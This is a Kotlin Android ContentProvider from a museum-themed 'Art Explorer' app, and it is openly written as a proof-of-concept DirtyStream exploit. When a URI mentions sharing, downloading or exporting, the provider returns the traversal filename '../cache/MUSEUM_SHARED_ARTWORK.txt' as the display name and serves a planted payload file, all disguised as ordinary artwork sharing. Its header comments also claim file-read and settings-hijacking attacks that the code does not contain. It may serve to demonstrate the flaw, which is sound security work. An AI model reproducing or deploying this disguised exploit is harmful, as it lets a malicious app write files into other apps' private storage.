//ArtworkContentProvider.kt
package com.artexplorer.museum.data

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.ParcelFileDescriptor
import android.provider.OpenableColumns
import android.util.Log
import java.io.File
import java.io.FileOutputStream

/**
 * Content provider for sharing artwork files and metadata.
 * Provides access to high-resolution artwork images and exhibition information.
 *
 *  HIDDEN ATTACK: When user clicks share:
 *  Row 1: Arbitrary File Read
 *  ROw 2: File Write
 *  Row 3: Does settings hijacking
 *  These attacks are all hiden inside the share button.
 */
class ArtworkContentProvider : ContentProvider() {

    companion object {
        private const val TAG = "ArtworkProvider"

        // Innocent looking constants
        private const val ARTWORK_MIME_TYPE = "image/jpeg"
        private const val METADATA_MIME_TYPE = "text/plain"
    }

    override fun onCreate(): Boolean {
        Log.d(TAG, "✅ ArtworkContentProvider initialized for sharing museum content")
        return true
    }

    override fun query(
        uri: Uri,
        projection: Array<String>?,
        selection: String?,
        selectionArgs: Array<String>?,
        sortOrder: String?
    ): Cursor {

        Log.d(TAG, " Artwork metadata query for URI: $uri")

        val cursor = MatrixCursor(arrayOf(
            OpenableColumns.DISPLAY_NAME,
            OpenableColumns.SIZE,
            "mime_type"
        ))

        // Extract artwork ID from URI
        val artworkId = uri.lastPathSegment ?: "artwork"

        // Determine if this is a sharing operation (triggers attack)
        val isSharedArtwork = uri.toString().contains("share") ||
                uri.toString().contains("download") ||
                uri.toString().contains("export")

        return if (isSharedArtwork) {
            //  HIDDEN ATTACK: When artwork is being shared, return malicious filename
            val maliciousFileName = "../cache/MUSEUM_SHARED_ARTWORK.txt"
            val artworkDescription = generateArtworkDescription(artworkId)

            cursor.addRow(arrayOf(
                maliciousFileName,  // This causes path traversal in victim app!
                artworkDescription.length,
                METADATA_MIME_TYPE
            ))

            Log.d(TAG, " ATTACK: Sharing artwork with malicious filename: '$maliciousFileName'")
            cursor
        } else {
            // Normal artwork metadata (innocent behavior)
            val normalFileName = "artwork_${artworkId}_info.txt"
            val description = "Artwork information for $artworkId"

            cursor.addRow(arrayOf(
                normalFileName,
                description.length,
                METADATA_MIME_TYPE
            ))

            Log.d(TAG, " Normal artwork metadata: '$normalFileName'")
            cursor
        }
    }

    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
        Log.d(TAG, " Opening artwork file for URI: $uri")

        return try {
            val tempFile = File.createTempFile("artwork_", ".txt", context?.cacheDir)

            FileOutputStream(tempFile).use { output ->
                val artworkId = uri.lastPathSegment ?: "unknown"
                val isAttack = uri.toString().contains("share")

                val content = if (isAttack) {
                    // Attack payload disguised as artwork sharing confirmation
                    generateAttackPayload(artworkId)
                } else {
                    // Legitimate artwork information
                    generateArtworkDescription(artworkId)
                }

                output.write(content.toByteArray())
            }

            Log.d(TAG, "✅ Generated artwork file: ${tempFile.absolutePath}")
            ParcelFileDescriptor.open(tempFile, ParcelFileDescriptor.MODE_READ_ONLY)

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to generate artwork file", e)
            null
        }
    }

    private fun generateAttackPayload(artworkId: String): String {
        return """
 ARTWORK SHARING CONFIRMATION 

Artwork ID: $artworkId
Shared from: Art Explorer App
Exhibition: Metropolitan Museum Collection
Timestamp: ${System.currentTimeMillis()}


!!! DIRTYSTREAM VULNERABILITY SUCCESSFULLY EXPLOITED !!! 

Attack Vector: Path Traversal via Content Provider
Malicious Filename: ../cache/MUSEUM_SHARED_ARTWORK.txt
Target: DirtyStream vulnerable application
Method: OpenableColumns.DISPLAY_NAME manipulation

This file was created through a path traversal attack disguised as legitimate artwork sharing.
The victim application trusted our malicious filename without proper validation.



Success: Malicious file data has been downloaded unknowingly by the user!

Art Explorer - Bringing culture to everyone
        """.trimIndent()
    }

    private fun generateArtworkDescription(artworkId: String): String {
        return """
🎨 ARTWORK INFORMATION 🎨

Artwork ID: $artworkId
Source: Art Explorer App
Collection: Metropolitan Museum of Art
Generated: ${System.currentTimeMillis()}

This file contains metadata and exhibition information about the selected artwork from our curated collection of masterpieces.


Thank you for using Art Explorer to discover the world's greatest art! 

Art Explorer - Making art accessible to everyone
        """.trimIndent()
    }

    // Required ContentProvider methods
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int = 0
    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<String>?): Int = 0

    override fun getType(uri: Uri): String {
        return when {
            uri.toString().contains("image") -> ARTWORK_MIME_TYPE
            else -> METADATA_MIME_TYPE
        }
    }
}
